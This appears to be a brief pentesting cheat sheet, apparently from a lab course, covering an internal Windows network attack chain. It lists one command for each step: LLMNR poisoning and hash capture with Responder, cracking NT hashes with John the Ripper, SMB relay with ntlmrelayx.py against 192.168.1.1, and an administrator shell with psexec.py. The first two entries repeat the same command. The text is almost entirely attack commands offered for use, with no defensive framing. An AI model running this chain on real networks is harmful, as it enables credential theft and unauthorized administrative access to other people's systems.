* **LLMNR Poisoning Overview**: Exploit Link-Local Multicast Name Resolution.
	- Sniff network for hashed credentials.
		```bash
		responder -I eth0 -wrf
		```
* **Capturing Hashes with Responder**: Sniff network for hashed credentials.
	- Sniff network for hashed credentials.
		```bash
		responder -I eth0 -wrf
		```
* **Cracking Our Captured Hashes**: Utilize tools like John the Ripper for cracking.
	- Cracking hashed passwords.
		```bash
		john --format=NT hash.txt
		```
* **SMB Relay Attacks Lab**: Perform SMB relay attacks.
	- Perform SMB relay attacks.
		```bash
		ntlmrelayx.py -t smb://192.168.1.1 -smb2support
		```
* **Gaining Shell Access**: Exploit gained credentials to achieve shell access.
	- Gain shell access.
		```bash
		psexec.py administrator@192.168.1.1
		```
